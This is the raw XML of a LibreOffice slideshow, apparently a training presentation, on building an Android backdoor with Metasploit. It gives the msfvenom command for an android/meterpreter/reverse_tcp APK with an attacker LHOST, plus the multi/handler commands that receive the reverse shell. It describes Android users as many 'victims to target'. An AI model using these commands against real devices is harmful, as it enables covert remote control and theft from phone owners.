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style:text-autospace="none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.953cm" fo:margin-right="0cm" fo:text-indent="-0.953cm" style:text-autospace="none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font-size="40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1" fo:font-size="36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Arial1" fo:font-size="28pt" style:font-name-complex="Arial1" style:font-size-complex="28pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial1" fo:font-size="28pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial1" fo:font-size="28pt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Arial1" fo:font-size="44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Arial1" fo:font-size="42.4000015258789pt" style:font-name-complex="Arial1" style:font-size-complex="32pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial1" fo:font-size="32pt" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial1" fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial1" fo:font-size="32pt" style:font-name-complex="Arial1" style:font-size-complex="3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Android Malware Injection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 text:style-name="P2"><text:span text:style-name="T2">Injecting Metasploit Payloads into Android Applications</text:span><text:span text:style-name="T3">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xml:id="id1" draw:id="id1">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <draw:frame presentation:style-name="pr1" draw:text-style-name="P4" draw:layer="layout" svg:width="20cm" svg:height="2cm" svg:x="1.4cm" svg:y="1.6cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T4">Why Hack Android Phones?</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.47cm" svg:y="6.35cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P5"><text:span text:style-name="T5">• <text:s/></text:span><text:span text:style-name="T6">So the first question that comes to our mind after hearing this is why in the world we would like to hack </text:span><text:span text:style-name="T7">Android Phones</text:span><text:span text:style-name="T6">? The answer to that question is really simple majority of the people out there are android users and you have a lot of victims to target </text:span></text:p>
            <text:p text:style-name="P6"><text:span text:style-name="T5">• <text:s/></text:span><text:span text:style-name="T6">But seriously don’t hack anyone’s device without their <text:s text:c="6"/>permission or you can get into a lot of trouble for doing <text:s text:c="4"/>android hacking. </text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <anim:par presentation:node-type="timing-root">
          <anim:par smil:begin="id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xml:id="id2" draw:id="id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2"><text:span text:style-name="T8">What is Android?</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.418cm" svg:height="12.881cm" svg:x="1.252cm" svg:y="5.407cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P5"><text:span text:style-name="T9">• </text:span><text:span text:style-name="T10">Android</text:span><text:span text:style-name="T11"> is a </text:span><text:span text:style-name="T11"><text:a xlink:href="https://en.wikipedia.org/wiki/Mobile_operating_system%22%20%5Co%20%22Mobile%20operating%20system" xlink:type="simple">mobile operating system</text:a></text:span><text:span text:style-name="T11"><text:s/>developed by </text:span><text:span text:style-name="T11"><text:a xlink:href="https://en.wikipedia.org/wiki/Google%22%20%5Co%20%22Google" xlink:type="simple">Google</text:a></text:span><text:span text:style-name="T11">, based on the </text:span><text:span text:style-name="T11"><text:a xlink:href="https://en.wikipedia.org/wiki/Linux_kernel%22%20%5Co%20%22Linux%20kernel" xlink:type="simple">Linux kernel</text:a></text:span><text:span text:style-name="T11"><text:s/>and designed primarily for </text:span><text:span text:style-name="T11"><text:a xlink:href="https://en.wikipedia.org/wiki/Touchscreen%22%20%5Co%20%22Touchscreen" xlink:type="simple">touchscreen</text:a></text:span><text:span text:style-name="T11"><text:s/>mobile devices such as </text:span><text:span text:style-name="T11"><text:a xlink:href="https://en.wikipedia.org/wiki/Smartphone%22%20%5Co%20%22Smartphone" xlink:type="simple">smartphones</text:a></text:span><text:span text:style-name="T11"><text:s/>and </text:span><text:span text:style-name="T11"><text:a xlink:href="https://en.wikipedia.org/wiki/Tablet_computer%22%20%5Co%20%22Tablet%20computer" xlink:type="simple">tablets</text:a></text:span><text:span text:style-name="T11">. </text:span></text:p>
            <text:p text:style-name="P6"><text:span text:style-name="T12">•</text:span><text:span text:style-name="T12"><text:tab/></text:span><text:span text:style-name="T11">Initially developed by Android Inc., which <text:s text:c="15"/>Google bought in 2005.</text:span></text:p>
            <text:p text:style-name="P6"><text:span text:style-name="T11">Kernel:</text:span><text:span text:style-name="T11"><text:a xlink:href="https://www.howtogeek.com/howto/31632/what-is-the-linux-kernel-and-what-does-it-do/" xlink:type="simple">https://www.howtogeek.com/howto/31632/what-is-the-linux-kernel-and-what-does-it-do/</text:a></text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <anim:par presentation:node-type="timing-root">
          <anim:par smil:begin="id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xml:id="id3" draw:id="id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hat is Metasploit?</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="5.334cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Metasploit was created by H. D. Moore in 2003 as a portable network tool using Perl. By 2007, the Metasploit Framework had been completely rewritten in Ruby.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>To put it in simple words it is an Open Source Framework, a tool for creating exploits for the remote victims and it also has a whole list of exploits readily available in Metasploit Framework.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>It is the favorite tools for security researchers and ethical hackers to perform their attacks. It is super simple to create different payloads for different Operating Systems and platforms.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xml:id="id4" draw:id="id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etasploit for Android Hacking?</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="6.096cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>We are going to create Backdoor and install that on Victims Phone.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>What is Backdoor?</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>A Backdoor is a method or a way of bypassing authentication in product, computer etc. They are usually used for unauthorized access to a computer.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xml:id="id5" draw:id="id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quirements:-</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="5.842cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Metasploit Framework (Pre-Installed in Kali Linux)</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Victims Android Smart phone (here I am using android emulator)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xml:id="id6" draw:id="id6">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <draw:frame presentation:style-name="pr1" draw:text-style-name="P7" draw:layer="layout" svg:width="23.238cm" svg:height="2cm" svg:x="1.4cm" svg:y="1.6cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T13">Step By Step Hacking Android Phone Using Metasploit:</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="5.588cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Open Terminal.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>We are going to use Metasploit Venom Framework to create the exploit/Backdoor.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Command:</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;attacker_system_ip&gt; LPORT=4444 R &gt; hack.apk</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>payload is the portion of the malware which performs malicious action</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Let me explain the above Command so we are using msfvenom <text:s/>as the exploit generator for and android using Meterpreter for the reverse connection to the attackers system. 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xml:id="id7" draw:id="id7">
        <draw:frame presentation:style-name="pr1" draw:layer="layout" svg:width="20cm" svg:height="2cm" svg:x="1.4cm" svg:y="1.6cm" presentation:class="title">
          <draw:text-box>
            <text:p>How Meterpreter works</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.379cm" svg:y="5.129cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>The target executes the initial stager. This is usually one of bind, reverse, etc.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>The Metepreter core initializes, establishes a TLS/1.0 link over the socket and sends a GET. Metasploit receives this GET and configures the client.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Lastly, Meterpreter loads extensions. It will always load stdapi and will load priv if the module gives administrative rights. All of these extensions are loaded over TLS/1.0 using a TLV protocol.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xml:id="id8" draw:id="id8">
        <draw:frame presentation:style-name="pr1" draw:layer="layout" svg:width="20cm" svg:height="2cm" svg:x="1.4cm" svg:y="1.6cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Continue..</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="5.508cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>LHOST defines the attackers ip address where he will get the reverse connection from the victim.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>LPORT connection will be made on port 4444 and R &gt; is used to generate the executable.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Now we are all ready for the next step as this payload use reverse_tcp so the attacker will be listening to the port specified in the payload for a reverse connection from the victim.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>So now we need to set up handler to handle incoming connections to the port.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xml:id="id9" draw:id="id9">
        <draw:frame presentation:style-name="pr1" draw:layer="layout" svg:width="20cm" svg:height="2cm" svg:x="1.4cm" svg:y="1.6cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Continue..</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="5.553cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Right some command to create handler to handle incoming connection.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Msfconsole- to start Metasploit framework. </text:p>
              </text:list-item>
              <text:list-item>
                <text:p>use exploit/multi/handler</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>set payload android/meterpreter/reverse_tcp</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>set lhost &lt;attackers ip-address&gt;</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>set lport 4444</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Exploit- to run the exploitation.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Now as soon as the attacker installs the APK exploit/Backdoor you will get the reverse meterpreter session on you terminal. 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xml:id="id10" draw:id="id10">
        <draw:frame presentation:style-name="pr1" draw:layer="layout" svg:width="20cm" svg:height="2cm" svg:x="1.4cm" svg:y="1.6cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>References :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en.wikipedia.org/wiki/Android_application_package" xlink:type="simple">https://en.wikipedia.org/wiki/Android_application_package</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="https://www.howtogeek.com/howto/31632/what-is-the-linux-kernel-and-what-does-it-do/" xlink:type="simple">https://www.howtogeek.com/howto/31632/what-is-the-linux-kernel-and-what-does-it-do/</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="https://securitytraning.com/hacking-android-smartphone-using-metasploit/" xlink:type="simple">https://securitytraning.com/hacking-android-smartphone-using-metasploit/</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="https://en.wikipedia.org/wiki/Deb_%28file_format%29" xlink:type="simple">https://en.wikipedia.org/wiki/Deb_%28file_format%29</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="https://www.youtube.com/" xlink:type="simple">https://www.youtube.com</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="https://en.wikipedia.org/wiki/Payload_%28computing%29" xlink:type="simple">https://en.wikipedia.org/wiki/Payload_%28computing%29</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" xlink:type="simple">https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/</text:a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xml:id="id11" draw:id="id11">
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P8" draw:layer="layout" svg:width="25.2cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="5cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p><text:span text:style-name="T14"/></text:p>
                <text:p><text:span text:style-name="T14"/></text:p>
                <text:p><text:span text:style-name="T14"><text:s text:c="13"/></text:span><text:span text:style-name="T14">THANK YOU <text:s/>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1:27:11.520441269</meta:creation-date>
    <meta:editing-duration>PT24M29S</meta:editing-duration>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:generator>LibreOffice/5.4.1.2.0$Linux_X86_64 LibreOffice_project/40m0$Build-2</meta:generator>
    <dc:date>2017-10-27T13:53:05.516973460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